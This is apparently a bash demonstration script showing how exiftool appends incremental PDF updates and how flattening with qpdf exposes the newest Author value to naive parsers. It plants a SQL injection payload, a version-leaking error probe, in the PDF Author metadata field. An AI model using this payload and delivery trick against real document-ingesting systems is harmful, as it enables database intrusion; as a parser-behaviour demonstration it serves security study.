#!/usr/bin/env bash
#
# incremental_demo.sh — demonstrates the incremental-update problem.
#
# Shows how exiftool, when editing PDF metadata, does NOT rewrite the file but
# appends a new version at the end, leaving the old one in place.
#
# Requires: exiftool, qpdf
#
set -euo pipefail

WORK="$(mktemp -d)"
BASE="$WORK/base.pdf"
EDITED="$WORK/edited.pdf"
FLAT="$WORK/flat.pdf"

echo "[*] Working directory: $WORK"
echo

#Starting PDF with an "original" author
python3 "$(dirname "$0")/gen_pdf.py" "izzy" -o "$BASE" >/dev/null
echo "[1] Starting PDF -> /Author (Izzy)"
echo

#Edit with exiftool: inject a payload into the Author field
cp "$BASE" "$EDITED"
exiftool -Author="x'); SELECT CAST(@@version AS INT);--" -overwrite_original "$EDITED" >/dev/null
echo "[2] After exiftool -Author=\"x'); SELECT CAST(@@version AS INT);--\":"
echo "    /Author occurrences in the file:"
strings "$EDITED" | grep -i author | sed 's/^/      /'
echo
echo "    -> Note the MULTIPLE occurrences: the old 'izzy' is still"
echo "       at the top of the file. A naive parser reads THAT, not the payload."
echo

#Flatten with qpdf: consolidate the incremental updates
qpdf "$EDITED" "$FLAT"
echo "[3] After 'qpdf edited.pdf flat.pdf':"
echo "    /Author occurrences in the file:"
strings "$FLAT" | grep -i author | sed 's/^/      /'
echo
echo "    -> Now there is a single occurrence with the payload: it reaches even"
echo "       the naive parser."
echo
echo "[*] Files generated in: $WORK"
echo "    base.pdf / edited.pdf / flat.pdf"
